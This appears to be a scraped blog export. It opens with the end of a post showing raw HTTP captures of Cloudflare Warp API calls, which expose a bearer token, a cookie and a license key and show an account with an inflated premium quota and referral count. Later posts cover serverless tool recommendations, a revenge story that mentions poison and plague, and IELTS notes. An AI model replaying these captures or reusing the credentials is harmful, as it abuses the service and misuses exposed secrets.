keep-alive CF-Ray: 813492f7c9a696c0-SJC CF-Cache-Status: DYNAMIC Vary: Accept-Encoding x-envoy-upstream-service-time: 4098 Report-To: {\u0026#34;endpoints\u0026#34;:[{\u0026#34;url\u0026#34;:\u0026#34;https:\\/\\/a.nel.cloudflare.com\\/report\\/v3?s=Qy8emNDUPCJGcbD5y2yy04auosZBfIsuUKdFzv13Qu6YVCHItE%2BWjBtf6G2NBL9UcW2uaLGM6C0RJzmLg80ITaN0yKA%2BmiGPRBxU70VOfJIr1aZo7jurHbycP%2FiaKrc5tD2VBeOaesI90A%3D%3D\u0026#34;}],\u0026#34;group\u0026#34;:\u0026#34;cf-nel\u0026#34;,\u0026#34;max_age\u0026#34;:604800} NEL: {\u0026#34;success_fraction\u0026#34;:0,\u0026#34;report_to\u0026#34;:\u0026#34;cf-nel\u0026#34;,\u0026#34;max_age\u0026#34;:604800} Server: cloudflare Content-Encoding: gzip {\u0026#34;id\u0026#34;:\u0026#34;2b4d3261-ad36-4069-95ea-53520cd42a58\u0026#34;,\u0026#34;created\u0026#34;:\u0026#34;0001-01-01T00:00:00Z\u0026#34;,\u0026#34;updated\u0026#34;:\u0026#34;2023-10-09T06:30:20.041792568Z\u0026#34;,\u0026#34;premium_data\u0026#34;:0,\u0026#34;quota\u0026#34;:0,\u0026#34;warp_plus\u0026#34;:true,\u0026#34;referral_count\u0026#34;:0,\u0026#34;referral_renewal_countdown\u0026#34;:0,\u0026#34;role\u0026#34;:\u0026#34;child\u0026#34;} PUT /v0a2223/reg/0b831bf3-224d-4d45-869b-b59edd27e739/account HTTP/1.1 Host: api.cloudflareclient.com Accept: */* CF-Client-Version: a-6.11-2223 Connection: Keep-Alive Accept-Encoding: gzip User-Agent: okhttp/3.12.1 Content-Type: application/json; charset=UTF-8 Authorization: Bearer 40ca084f-315e-45e2-9191-b59199c2331a Cookie: __cf_bm=Fy2G.5O4ravUG7amYkVN3pFXyXviJwPUOkSrgy47_so-1696833013-0-AcoPy8M7MrOFuI+c74qOYNs875Cp/we0MEq6M/wdlySHgOigyzY5f3+52sIv12h9pB+WV55CalcoCwYkuN3VQSo= Content-Length: 41 {\u0026#34;license\u0026#34;: \u0026#34;7O95xNh3-81E65Kce-W4ln892I\u0026#34;} HTTP/1.1 200 OK Date: Mon, 09 Oct 2023 06:30:23 GMT Content-Type: application/json; charset=utf-8 Transfer-Encoding: chunked Connection: keep-alive CF-Ray: 81349313896196c0-SJC CF-Cache-Status: DYNAMIC Vary: Accept-Encoding x-envoy-upstream-service-time: 1211 Report-To: {\u0026#34;endpoints\u0026#34;:[{\u0026#34;url\u0026#34;:\u0026#34;https:\\/\\/a.nel.cloudflare.com\\/report\\/v3?s=0drwc3hjXQSCR2MN19A9gx%2BF3frLTlL76tvd1viYTqf3tTU0Js%2FdM3eoyqU%2FL0py%2FoPJYAJsZTemfGo%2BYsEuVLddoeEJ%2BzaE9RECqldUdGpuskVjquX3RMqoD5UtMAWdXsjtiR5mB7Wagw%3D%3D\u0026#34;}],\u0026#34;group\u0026#34;:\u0026#34;cf-nel\u0026#34;,\u0026#34;max_age\u0026#34;:604800} NEL: {\u0026#34;success_fraction\u0026#34;:0,\u0026#34;report_to\u0026#34;:\u0026#34;cf-nel\u0026#34;,\u0026#34;max_age\u0026#34;:604800} Server: cloudflare Content-Encoding: gzip {\u0026#34;id\u0026#34;:\u0026#34;b55baa96-a450-4332-9f39-f3046b6ea86a\u0026#34;,\u0026#34;created\u0026#34;:\u0026#34;0001-01-01T00:00:00Z\u0026#34;,\u0026#34;updated\u0026#34;:\u0026#34;2023-10-09T06:30:23.027025975Z\u0026#34;,\u0026#34;premium_data\u0026#34;:24598563000000000,\u0026#34;quota\u0026#34;:24598563000000000,\u0026#34;warp_plus\u0026#34;:true,\u0026#34;referral_count\u0026#34;:24598563,\u0026#34;referral_renewal_countdown\u0026#34;:0,\u0026#34;role\u0026#34;:\u0026#34;child\u0026#34;} GET /v0a2223/reg/0b831bf3-224d-4d45-869b-b59edd27e739/account HTTP/1.1 Host: api.cloudflareclient.com Accept: */* CF-Client-Version: a-6.11-2223 Connection: Keep-Alive Accept-Encoding: gzip User-Agent: okhttp/3.12.1 Authorization: Bearer 40ca084f-315e-45e2-9191-b59199c2331a Cookie: __cf_bm=Fy2G.5O4ravUG7amYkVN3pFXyXviJwPUOkSrgy47_so-1696833013-0-AcoPy8M7MrOFuI+c74qOYNs875Cp/we0MEq6M/wdlySHgOigyzY5f3+52sIv12h9pB+WV55CalcoCwYkuN3VQSo= HTTP/1.1 200 OK Date: Mon, 09 Oct 2023 06:30:23 GMT Content-Type: application/json; charset=utf-8 Transfer-Encoding: chunked Connection: keep-alive CF-Ray: 8134931d99d396c0-SJC CF-Cache-Status: DYNAMIC Vary: Accept-Encoding x-envoy-upstream-service-time: 199 Report-To: {\u0026#34;endpoints\u0026#34;:[{\u0026#34;url\u0026#34;:\u0026#34;https:\\/\\/a.nel.cloudflare.com\\/report\\/v3?s=UUOYPQkNQWPKUfe6SGnsX8qgZ4yYrd%2FvoiX83NpDNYALCUunDdWYN9NL6SQHLhxzSCv%2FRyPWDEIL7q16wtOGVWrR39hbCZsKH4IA%2FFObYgmb7C6m0HHC3eCQxvn6eqxV9L77U7T8rumrBQ%3D%3D\u0026#34;}],\u0026#34;group\u0026#34;:\u0026#34;cf-nel\u0026#34;,\u0026#34;max_age\u0026#34;:604800} NEL: {\u0026#34;success_fraction\u0026#34;:0,\u0026#34;report_to\u0026#34;:\u0026#34;cf-nel\u0026#34;,\u0026#34;max_age\u0026#34;:604800} Server: cloudflare Content-Encoding: gzip {\u0026#34;id\u0026#34;:\u0026#34;b55baa96-a450-4332-9f39-f3046b6ea86a\u0026#34;,\u0026#34;account_type\u0026#34;:\u0026#34;limited\u0026#34;,\u0026#34;created\u0026#34;:\u0026#34;2023-10-09T06:30:12.82392Z\u0026#34;,\u0026#34;updated\u0026#34;:\u0026#34;2023-10-09T06:30:23.027025Z\u0026#34;,\u0026#34;premium_data\u0026#34;:24598563000000000,\u0026#34;quota\u0026#34;:24598563000000000,\u0026#34;warp_plus\u0026#34;:true,\u0026#34;referral_count\u0026#34;:24598563,\u0026#34;referral_renewal_countdown\u0026#34;:0,\u0026#34;role\u0026#34;:\u0026#34;child\u0026#34;,\u0026#34;license\u0026#34;:\u0026#34;7O95xNh3-81E65Kce-W4ln892I\u0026#34;} DELETE /v0a2223/reg/0b831bf3-224d-4d45-869b-b59edd27e739 HTTP/1.1 Host: api.cloudflareclient.com Accept: */* CF-Client-Version: a-6.11-2223 Connection: Keep-Alive Accept-Encoding: gzip User-Agent: okhttp/3.12.1 Authorization: Bearer 40ca084f-315e-45e2-9191-b59199c2331a Cookie: __cf_bm=Fy2G.5O4ravUG7amYkVN3pFXyXviJwPUOkSrgy47_so-1696833013-0-AcoPy8M7MrOFuI+c74qOYNs875Cp/we0MEq6M/wdlySHgOigyzY5f3+52sIv12h9pB+WV55CalcoCwYkuN3VQSo= HTTP/1.1 204 No Content Date: Mon, 09 Oct 2023 06:30:25 GMT Connection: keep-alive Report-To: {\u0026#34;endpoints\u0026#34;:[{\u0026#34;url\u0026#34;:\u0026#34;https:\\/\\/a.nel.cloudflare.com\\/report\\/v3?s=0xOQ2ahaxjRl6A1krBHDAP33evulwaakRrFst09ItQ%2BIsWyQ7rkeTFyNhYd39BMFXc2wR6ULCRtVuRhbY8BhXZGv1XegNl%2Bm6d2%2Fz7%2FkMX6LhBtAJYb9Bz1GGdooOhWiKUy3GbIlK3bDjw%3D%3D\u0026#34;}],\u0026#34;group\u0026#34;:\u0026#34;cf-nel\u0026#34;,\u0026#34;max_age\u0026#34;:604800} NEL: {\u0026#34;success_fraction\u0026#34;:0,\u0026#34;report_to\u0026#34;:\u0026#34;cf-nel\u0026#34;,\u0026#34;max_age\u0026#34;:604800} Vary: Accept-Encoding Server: cloudflare CF-RAY: 813493218d1396c0-SJC Conclusion Finally, thank you for your patience, may you live a happy life.\nReferrence yonggekkk/warp-yg - Github WarpKey-Register-PRO - Replit rwkgyg/CFwarp - Gitlab ","date":"2023-10-09T14:29:43+08:00","image":"https://cdn.statically.io/gh/Misakaou/imagestorage@master/20231009/webpageheadimageCloudflare_54117147.6hbl4terqlj4.webp","permalink":"https://blog.moeomu.com/posts/cloudflare-warp-trace/","title":"Cloudflare Warp Trace"},{"content":"Source of this article: MoeomuBlog\nForeword If you intend to use Vercel, please fork it first and then proceed with the deployment. On GitHub, you can easily update the upstream to your fork.\nRSSHub Github: DIYgod/RSSHub\nIntroduction RSSHub is an open source, easy to use, and extensible RSS feed aggregator, it\u0026rsquo;s capable of generating RSS feeds from pretty much everything.\nRSSHub delivers millions of contents aggregated from all kinds of sources, our vibrant open source community is ensuring the deliver of RSSHub\u0026rsquo;s new routes, new features and bug fixes.\nPros Serverless deployment No extra charge Third-party full-text RSS fetching Support a large number of websites My view If you want to stay updated with news and receive real-time updates from any platform, you can achieve it through this service. It is easy to set up and serves as the perfect choice for escaping information censorship and information silos.\nStars: 9/10\numami Github: umami-software/umami\nIntroduction Umami is a simple, fast, privacy-focused alternative to Google Analytics.\nPros Serverless deployment No extra charge Protect guests\u0026rsquo; privacy from Google and other entities. Cons Require a database. Solution: Use serverless database: PlanetScale\nMy view Just as it is described, it is a convenient visitor analytics tool that is easy to deploy. After modifying the JavaScript file name, it can be inserted into any location.\nStar: 7/10\nOnedrive-Index Github: iRedScarf/onedrive-index\nIntroduction Showcase, share, preview, and download files inside your OneDrive with onedrive-vercel-index.\nPros Serverless deployment No extra charge Share your file with others Cons No one actively maintains it The original project has been archived My view Conveniently share files from OneDrive, once set up, you no longer need to worry about it, as it will run smoothly.\nStar: 6/10\nPicx Github: XPoet/picx\nIntroduction A CDN-accelerated image hosting management tool developed based on the GitHub API and jsDelivr. No need to download or install, it can be used online through the web browser. It\u0026rsquo;s free, stable, convenient, and lightning-fast.\nPros Serverless deployment No extra charge Image storage Cons No English translation My view You can place your blog images here, and CDN acceleration is also available for free, ensuring a smooth and optimal experience.\nStar: 7/10\nReferences RSSHub - Docs ","date":"2023-09-29T16:32:43+08:00","image":"https://cdn.statically.io/gh/Misakaou/imagestorage@master/20230929/webpageheadimageServerless_92298688.751yj4pxk328.webp","permalink":"https://blog.moeomu.com/posts/serverless-open-source-project-recommendations/","title":"Serverless Open Source Project Recommendations"},{"content":"Source of this article: MoeomuBlog\nBackground This is a slightly darker plot, a revenge story and a tragedy at the same time, so let me know if you don\u0026rsquo;t like it, please!\nIn the past ten years, a foreign general and I were entangled in a tumultuous love-hate relationship. Ten years ago, he killed all my loved ones, leaving me devastated. And now, after a decade of planning, I have brought destruction upon his kingdom. With the cloud-shaped dagger he had once given me, I plunged it into his heart.\nTen years ago The general stood tall, accompanied by his colossal giant guardians, resembling mountains of steel. They wielded their dual hammers, mercilessly destroying my homeland. I will forever remember the image of my grandfather, torn apart and lifeless, his body mangled, and his eyes filled with despair. Trembling with fear, I hid behind a massive rock, praying not to be discovered. Unfortunately, I, along with a few survivors, were captured and taken to prison. On our way, a tightly wrapped officer thoroughly searched every pocket. The general had triumphed in this battle. The seed of hatred sprouted within me as I stared fiercely at him, inspecting the spoils of war in the prison. His eyes were as cold and merciless as a sharpened blade, his demeanor as frigid as an ancient iceberg. He did not see me; his gaze was consumed by thoughts of war and glory.\nI began plotting my escape. While discussing with my fellow inmates how to break free, one of them mentioned having a small knife that could cut through the somewhat unreliable locks. However, she underestimated the resilience of these seemingly simple locks. After several attempts, we gave up. Feeling lost, I absentmindedly reached into my pocket and discovered an Ender Pearl. Though unsure of its purpose, I knew it had the power of teleportation. Without hesitation, I flung it towards the iron bars, and as expected, after a moment of dizziness, I found myself outside the prison walls.\nSpanning the decade Covered in dirt and grime, I was taken in by a kind-hearted family, finally finding a home once again. Unfortunately, the fleeting moments of happiness were cut short as we were separated during the chaotic times of war and displacement. To survive, I resorted to singing in small taverns, scraping by on meager earnings. Luckily, I caught the attention of the royal court\u0026rsquo;s musical ensemble, who were conducting a civilian talent show on the streets in order to unite the people. And so, I became a member of the royal song and dance troupe.\nOver the years, I gradually learned the art of singing and dancing. The sudden leap in social status was difficult to adjust to, but it also provided me with the opportunity to engage in other activities. I learned how to charm the nobles, using my eyes to captivate them, every smile and gesture stirring their hearts and desires. In addition, I spent my remaining time assisting at the monastery, forming a close bond with the nuns and gaining the chance to study medicine. The nuns warned me to be cautious in my actions, to let kindness guide me, as any misstep could invite plague, a divine punishment, a devastating calamity.\nAs fate would have it, the general, at the request of the royal family, arrived at the palace to witness the court\u0026rsquo;s performances. His countenance remained stern, his deep blue eyes as captivating as the boundless sky. On that night, as I danced with grace and sang with beauty, his gaze seemed to soften, filled with tenderness. From that day forward, he sought me out in private, but I refused his advances for various reasons, resorting to exchanging letters instead.\nHis desire to see me grew stronger, leading him to invite the royal court to his ducal estate. Naturally, the royal orchestra accompanied them to liven up the occasion. As the night drew to a close, I found myself intercepted by guards on the way, escorted to the general\u0026rsquo;s private reception room. When he saw me enter, his sharp eyebrows softened, his deep indigo eyes brimming with affection. He looked at me and said, \u0026ldquo;Why have you been avoiding me? What worries you?\u0026rdquo; I immediately feigned a distressed expression and replied, \u0026ldquo;I\u0026rsquo;m truly afraid.\u0026rdquo; Gently, he pulled me into his arms, and I offered no resistance. \u0026ldquo;Afraid of me?\u0026rdquo; he asked. \u0026ldquo;Yes,\u0026rdquo; I replied. \u0026ldquo;And now?\u0026rdquo; he inquired. \u0026ldquo;Not as much anymore.\u0026rdquo; I gazed into his captivating eyes, and he tenderly kissed my forehead.\nOur clandestine relationship grew stronger, our meetings more frequent. I could see the fiery desire in his eyes, burning brighter with each encounter. Soon, I would have my revenge. In my mind, I silently compared various methods of murder I had accumulated over the years, ultimately deciding on poisoning him. Referring to the records in the monastery\u0026rsquo;s library, I chose to extract KCN, a highly toxic substance, from a pigment known as Prussian Blue. I learned some basic chemistry from the nuns and, under the pretense of wanting to paint, playfully requested a large quantity of paint from the general. Back at home, following the instructions from the books, I carefully extracted a small amount of KCN, sealed it securely, and pondered its potential use in the future.\nAs time went by, our repeated dates made us the most familiar people to each other, apart from my childhood memories. He held me close as we admired the flowers under the night sky, seeming slightly intoxicated. \u0026ldquo;Am I more beautiful, or are the flowers?\u0026rdquo; I asked playfully. \u0026ldquo;Your smile is more beautiful than roses, and your eyes are like a deep blue ocean. Every time our gazes meet, I can\u0026rsquo;t look away. You are my most beautiful garden,\u0026rdquo; he tenderly expressed, captivating me with his words. In that moment, I fantasized about how happy we could have been if I didn\u0026rsquo;t carry the burden of hatred. Although this man\u0026rsquo;s heart was hard to fathom, sometimes appearing slightly indifferent, while other times being passionately fiery.\nHe invited me on another outing, presenting a rectangular mahogany box. The delicate carvings and golden exterior made it look like an unparalleled work of art. I opened the box with surprise, revealing an exquisite dagger. The ivory handle gleamed, adorned with silver threads and gemstones, resembling elegant wisps of clouds, exuding an extraordinary elegance. \u0026ldquo;I don\u0026rsquo;t need this, take it back,\u0026rdquo; I said, feeling a surge of anger upon seeing the gift. How typical of a straight-laced man, truly befitting a duke general. \u0026ldquo;This is a token of our love, I love you, and I really want to marry you,\u0026rdquo; he spoke with a hint of urgency in his tone. \u0026ldquo;My position can only allow me to be your mistress. That\u0026rsquo;s the only way I can agree.” I replied with a smile. He seemed slightly embarrassed, a expression I had never seen on his face before. He continued, \u0026ldquo;I discussed it with my family, they won\u0026rsquo;t support it, but I can disregard my reputation and interests.\u0026rdquo; I caressed his face and asked, \u0026ldquo;Is it worth it for me?\u0026rdquo; Then, I immediately kissed him, not allowing him to say anything further.\nAs I looked at the token of love he had given me, I also saw the sincerity and tenderness in his eyes. In that moment, I had to admit to myself that my feelings for him had become twisted over the years. In his room, he showed me many of his diaries. He was someone who enjoyed drinking tea, and in the days that followed, I searched far and wide for authentic Eastern teas, carefully packaging them as exquisite gifts for him. He seemed to always complain that I wouldn\u0026rsquo;t let him into my heart.\nNow I had someone purchase a batch of rats locally and injected them with rat blood infected with a distant plague. I knew they would suffer, just like me. I murmured to one of the little cuties, \u0026ldquo;We\u0026rsquo;re really the same, aren\u0026rsquo;t we? We\u0026rsquo;re all the same. Just endure a little longer, it will all be over soon.\u0026rdquo; Standing at the entrance of my secret underground laboratory, I looked at the footprints on the lab floor and realized that someone had seemingly entered. But it didn\u0026rsquo;t matter anymore. Whoever it was, it was irrelevant. The rats had all been released, and the outcome was already predetermined.\nOn our final date, while he was away greeting important guests, I took out the white solid substance I had prepared. As I was about to pour it in, I hesitated. Complex emotions flooded my mind. Him and my happiness, our relationship, and the world, none of it mattered anymore. I made up my mind for revenge. I placed the white substance into the cup he often used for tea, and it dissolved instantly, leaving a hint of bitter almond taste mixed with the aroma of the tea, hoping he wouldn\u0026rsquo;t notice. After doing everything, I fell to the ground, overcome by tears streaming down my face.\nWhen he returned, I had already composed myself. He gently held me in his arms as he sat down, then picked up the cup of tea and savored the aroma as usual before drinking it all in one gulp. Suddenly, he was wracked with unbearable stomach pain and released me, urging me to call a doctor. In one swift motion, I reached behind me and plunged the dagger of love, which I always carried, into his heart. He looked at me with a mix of shock, confusion, and pain, as if he had finally remembered something. With his last bit of strength, he managed to say two words, \u0026ldquo;The pocket.\u0026rdquo; I rolled my eyes at him. My dress didn\u0026rsquo;t have any pockets. Suddenly, the scene before me shifted, and I was engulfed in memories. I recalled the prison where I was once held captive, instinctively reaching into my pocket and finding the Ender Pearl that had once saved me. I also remembered the tightly wrapped officer. It was you all along, but why?\nAn intense headache struck me, and I fainted. When I woke up again, I found myself in the Duke\u0026rsquo;s castle prison. \u0026ldquo;Your Highness, the assassin-dancer is here. The Duke is dead.\u0026rdquo; \u0026ldquo;Good.\u0026rdquo; I heard a voice speaking, a voice filled with fear. It was so familiar, how could he still be alive? Why did the guards address him as \u0026ldquo;Your Highness\u0026rdquo;? Years of court performance had honed my strong psychological resilience, allowing me to easily compose myself and await the mysterious twist of fate.\nThe face, familiar yet unfamiliar, suddenly appeared and shattered all my elegance. I couldn\u0026rsquo;t give up, but I was also happy. The complex emotions almost engulfed me completely: \u0026ldquo;Why? Why are you still alive?\u0026rdquo; His cold and stern expression remained unchanged: \u0026ldquo;You killed my brother. We are twins.\u0026rdquo; He entered the prison cell, gripping my jaw with a cold and indifferent expression that seemed to hold a hint of a smile: \u0026ldquo;You did well, so what do you want for your next mode of death? Burning at the stake or the iron maiden?\u0026rdquo; I looked at his face, sharp and emotionless, and I understood. Suddenly, I laughed wildly and madly: \u0026ldquo;Ah, ten years ago, beneath the Witch Ridge, it was you! It wasn\u0026rsquo;t him after all!\u0026rdquo; He still showed no expression, his eyebrows slightly furrowing before he let go, as if he understood why I suddenly shouted about the events of ten years ago.\nHe ordered the guards to step back, and as someone restrained with iron shackles, I posed no threat to him. He sat in a chair and asked me, \u0026ldquo;Don\u0026rsquo;t you want to know why?\u0026rdquo; I replied, \u0026ldquo;Who are you exactly?\u0026rdquo; He calmly said, \u0026ldquo;You are indeed naive enough. You cooperated with me to accomplish perfect slaughter. I owe my position to you.\u0026rdquo; He continued, \u0026ldquo;You killed the prince. We both took an interest in you. Apparently, he was just as naive as you, falling deeper and suffering more. The reputation of the witch after the priestess is well-deserved.\u0026rdquo; I asked, \u0026ldquo;During these years, who was it that was with me? Was it you or him?\u0026rdquo; He chuckled softly, \u0026ldquo;Sometimes it was me, sometimes it was him. So, you still couldn\u0026rsquo;t distinguish? That fool pretended to be my officer ten years ago, distributing ender pearls everywhere. I even laughed at his kindness. It didn\u0026rsquo;t matter if a few slaves escaped; it was laughable that they died at the hands of slaves. Furthermore, I have a question. The poison was enough to kill him, even to let you escape unharmed. Why the need for this extra step? Perhaps he couldn\u0026rsquo;t smell that scent, but I could. I knew it was poison.\u0026rdquo; I stared at his deep blue yet cold eyes for a moment, then turned my head, refusing to answer. He continued, \u0026ldquo;Your crude extraction methods left so many traces even in your own home. I had a friend investigate, and it became clear that you had sinister intentions. So, I used you while you were using me, but I truly didn\u0026rsquo;t expect you to be the runaway slave.\u0026rdquo;\nBefore leaving, he instructed the guards to take me to the public execution ground after lunch, where I would be burned at the stake. In the prison, I laughed manically. Did you really think that killing me would solve everything and stabilize the country? Yes, I once believed I was the hunter, but now I realize I am the hunted. On the public execution platform, I continued to laugh carelessly. He approached the stake and asked me, \u0026ldquo;Is this how it ends? Weren\u0026rsquo;t you supposed to be clever?\u0026rdquo; I looked towards the crowd gathering in the distance, a smile on my lips. \u0026ldquo;Is it over? No, it\u0026rsquo;s just the beginning.\u0026rdquo; \u0026ldquo;Explain yourself, or\u0026hellip;\u0026rdquo; His voice carried a hint of impatience. I turned my head to look at him, my eyes filled with three parts pity and seven parts amusement. \u0026ldquo;Or what? What else can you do besides killing me? Do you think that by killing me, you can escape judgment? You accused me of being a witch, so I curse this city, I curse you.\u0026rdquo; \u0026ldquo;What else have you done?\u0026rdquo; His brow furrowed deeply, on the verge of exploding. But I remained silent, smiling once again as I looked into the distance, as if searching for something in the deep blue sky. As his patience wore thin, I slowly closed my eyes, allowing the flames to consume me, savoring the requiem of death that I had designed for myself.\nTHE END\n","date":"2023-09-27T20:00:20+08:00","image":"https://cdn.statically.io/gh/Misakaou/imagestorage@master/20230929/webpageheadimageLiterature_84636833.3nwqlcfdnx4w.5zkk04m0znnk.webp","permalink":"https://blog.moeomu.com/posts/dream-recollection-dream-as-life-i-desire-you/","title":"Dream Recollection - Dream as Life, I Desire You"},{"content":"Source of this article: MoeomuBlog\nFlow Chart First words First\nAt the first stage / step\nInitially\nIn the beginning\nBeginning at X stage\nNext\nThen\nSubsequently\nIn the next / subsequent step\nin the following phase\nFinally\nIn the concluding phase\nCombine steps and then / which then follow after Additional information square rectangle sphere FlowChart: Overview paragraph Steps X consists of / involves three stages X is comprised / composed of three phases Three main stages are shown on the diagram that illustrates X Evaluation Evaluation: simple / complex Core material or tool Compare multi stage Final destination Map Directions + There be To the north, there is an undeveloped beach. Inversion (Directions + Verb + Subject) On the north is situated a fountain. Active and passive sentences lie Building A lies on the north side. be situated / located / sited Building B is sited on the north side. Start with a Change One change\u0026hellip; Another change\u0026hellip; can be seen / is made to One change is made to the location of the entrance. Azimuth expression in / to / on\nOne side of a large area to / in / on A direction in a limited area Inside: in the east of B Outside: to the ease of B On the edge: on the east side of B Part in the northern part on the northern side Road an east-west road a road running east to west Corner at the corner / turn at the junction Occupy occupy the area area being covered by Map: Overview paragraph 2 sentences.\nOverall evaluation ","date":"2023-07-02T15:00:00+08:00","image":"https://cdn.statically.io/gh/Misakaou/imagestorage@master/20230702/IELTS-Writing-Course-Note-07-FlowChart-and-Map-Essay.27ybe1oxgbk0.webp","permalink":"https://blog.moeomu.com/posts/ielts-writing-course-note-07-flowchart-and-map-essay/","title":"IELTS Writing Course Note 07 FlowChart and Map Essay"},{"content":"Source of this article: MoeomuBlog\nChange the subject Start with a Number 1% of the Yemen\u0026rsquo;s population was in / among / belonged to the 0-14 year old group in the year 2000. Use \u0026ldquo;There be\u0026rdquo; There was a proportion of 1% Yemen\u0026rsquo;s population belonging / that belonged to the 0-14 year old age group in the year 2000. Start with an info dimension The year 2000 saw a percentage of 1% of Yemen\u0026rsquo;s population among / belonging to the 0-14 year old group. The 0-14 year olds made up a proportion of 1% of Yemen\u0026rsquo;s population in 2000. Yemen\u0026rsquo;s population was composed of 1% individuals aged 0-14 years old in 2000. Start with an evaluation The highest proportion of Yemen\u0026rsquo;s population in 2000 was among the 0-14 year old group. Subject / Object The consumption of petrol and oil has been the highest, and it is projected to remain the first place until 2030. People preferred to use petrol and oil s their main sources of energy. Tense Past simple will do is expected to do\u0026hellip; is projected to do\u0026hellip; Continuous was increasing\u0026hellip; until\u0026hellip; Perfect \u0026hellip; Merge data Evaluation + specific values or trends Figure A is the highest over time, at 50 in the year M and 100 in the year N. Figure A experienced a steady growth, rising from 50 to 100. Before + After and then / which then In the year M, figure A is 10, and then / which then increased to 20 in the year N. follow Figure A reached a peak of 50% in the year M, followed by a O-year decline to 40%. Figure A reached a peak of 50% in the year M, with a following decline for O years to 40%. after After an increase from 10% to 15%, figure A dropped to nearly zero in the year N. Evaluation + specific values or trends + Before + After The year N saw a rise to 30 for figure A, around 2 times / twofold / doubling higher than this figure (15) in the year M. Main clause + contrast / analogy Conjunctions while / although While figure A recorded a significant growth from 30 to 40 by the year M, this figure remained basically unchanged between 35 and 40 from year O to N. Adverb however / similarly / in contrast Figure A saw a noticeable decline. Similarly, figure B decreased sharply. Figure A saw a noticeable decline. In contrast, figure B remained constantly over time. Adjective trend / patter Figure A saw a noticeable increase. A different pattern was seen in figure B, which decreased sharply. Before the year O, figure A decreased noticeable while figure B recorded an upward trend. In contrast, similar patterns were seen between year O and N, during which both figure A and B decreased gradually.\nOther year 18 year old group people aged 18 years old 18 year olds = 18 year old people ","date":"2023-07-02T14:00:00+08:00","image":"https://cdn.statically.io/gh/Misakaou/imagestorage@master/20230702/IELTS-Writing-Course-Note-06-Diagram-Essay.6t45w80e8veo.webp","permalink":"https://blog.moeomu.com/posts/ielts-writing-course-note-06-diagram-essay/","title":"IELTS Writing Course Note 06 Diagram Essay"},{"content":"Source of this article: MoeomuBlog\nOverall Rules Well organized Different expressions Multi data merged Rewrite paragraph Copy diagram title Overview paragraph Rough shape e.g.: In general / In sum / Overall, a higher proportion of males choose to study STEM fields, while more females prefer to study humanity-related subjects. Moreover, it is noticeable that there is a significant disparity / difference in major choices between genders across various fields of study.\nExtreme values and also add it in detail paragraph. Detail paragraph Split group Select the paragraph with the highest number of items as the basis for grouping Select the grouping latitude that contains all chart dimensions Writing order Extreme values (2-3 clauses) and related content Values with similarity (2-3 clauses) Supply self-selected values Change data object words Noun + A + B + C + D. A + Noun + B + C + D. Expressions: value \u0026amp; percentage \u0026amp; trend Value figure / data / number / amount / value Percentage percentage / proportion / rate / ratio / share Trend trend / pattern Relationship between value and sentence at / with A similar trend can be seen in figure A with an increase from 5 to 10. Figure A remained unchanged, at 10 from year M to N. Figure A is 10 in year M, with an increase to 20 in year N. Expressions: Proportion 5% of B is A. A represents 5% of B. A represents a proportion of 5% of B. accounts makes up comprises 5% of B is composed / made up of A. 5% of B is from / belongs to A. Expressions: Other Figure A is the highest, at 5% in the year M. There was a increase in / for figure A. The value increased by 5%。 see / experience / record / show Figure A saw an increase\u0026hellip; The year M / Group Experienced / recorded an increase\u0026hellip; Approximate number about around approximately just / slightly - over / below Figure A showed an upward / downward trend, rising from 5 to 10. Stable value verb: remain constantly at a level / 10 noun: experienced a period of stability Especial value except / besides / despite / in spite of e.g.: Figure A recorded a general increase from year M to N, despite a slight fluctuation between year X to Y. Expressions: Increase and decline rise / increase / grow / growth / climb (from a decline) decline / fall / drop e.g. Figure A rose from 5 to 10. SVO, rising from 5 to 10. Figure A experienced a fall from 5 to 10. SVO, with a fall from 5 to 10. Expressions: Fluctuation vary / variation fluctuate / fluctuation e.g. The figure vary / fluctuate between 10 and 15. The figure recorded d a variation / fluctuation between 10 and 15. Expressions: Multiplier verb. double / triple / quadruple Figure A double / triple / quadruple the original value. X times Figure A is 3 times the amount of Figure B. Figure A rose 3 times the amount of Figure B. two / three / fourfold There was a threefold increase in / for figure A. Modifiers almost / more / less than More than / less than be greater than / over / exceed + value be less than / below + value Overtake overtake / take over / surpass / take the lead over Figure A over took figure B in the year O. With in range within / less than / no more than + value The difference between figure A and B is no more than 5 from year M to N. Expressions: Max value peak highest point lowest point reach a lowest point / highest point / peak verb synonym: achieve / hit / attain reach a lowest point / highest point / peak of 90% Expressions: Same value Figure A and B are almost equal / same in value. Figure A is approximately the same as B. There is little difference between figure A and B. Expressions: Rebound Figure A rebound from\u0026hellip; to\u0026hellip; Figure A recorded a rebound from\u0026hellip; to\u0026hellip; Expressions: Gap gap / difference / disparity widen / increase / grow / become larger narrow / decrease / reduce / become smaller The gap / difference between figure A and B widened from year M. Expressions: Time By the year M, figure A Starting from the year M, figure A From the year M to N during, figure A The year M marked a point when figure A reached a peak. when + time point Figure A increased to 10 in the year O, when figure B decreased to the same value 20. which + value In year O, figure A over took figure B, which then decline gradually to 10. preposition + witch + time period Figure A increased from 10 to 20 from the year M to N, during which figure B remained constantly at 15. ","date":"2023-07-01T16:00:00+08:00","image":"https://cdn.statically.io/gh/Misakaou/imagestorage@master/20230701/IELTS-Writing-Course-Note-05-Diagram-Essay.7gcpp95llhts.webp","permalink":"https://blog.moeomu.com/posts/ielts-writing-course-note-05-diagram-essay/","title":"IELTS Writing Course Note 05 Diagram Essay"},{"content":"Source of this article: MoeomuBlog\nOutweigh Attention Must be neutral. Must lean toward a certain point of view. Write Outweigh essay sub paragraph first sentence 1+3+1 Same as Lesson1.\n1+2+1 First, one advantage of X is that\u0026hellip; However, we also need to note / acknowledge the (ADDITION) negative aspects of X. more concerning / alarming less concerning / relatively minor In fact, X can cause more concerning harm to\u0026hellip; Write overview paragraph paraphrase topic Same as previous. give opinion I believe that the drawbacks of this trend outweigh the benefits. Write ending paragraph conclusion Although X may offer benefits to A and B, the adverse effects on C and D are more substantial and should be taken into consideration. Complete Outweigh Example An increasing number of people are spending a significant amount of time on social media, interacting with friends through communication and gaming. First, the widespread availability of the internet and social media has greatly improved our ability to communicate. Furthermore, another advantage of social media is associated with its engaging and immersive experience. However, we need also note one relatively minor drawback of the social media. To conclude, while social media can be addictive, it is more important for us to acknowledge its positive aspects in terms of the enhancement of people\u0026rsquo;s communication and experience.\nLogic chain writing: Contrast rather than / instead of SVO, -S / -V / -O. Every individual possesses the capability to grow into responsible and contributing members of their community, rather than / instead of participating in actions that cause harm of destruction to society.\nwould rather than do than do rather do than doing without + N / on the contrary / otherwise SVO. On the contrary / Otherwise / Without adv., SVO. without which , without which = without + adv., in fact connecting the truth However, it is also true that mental 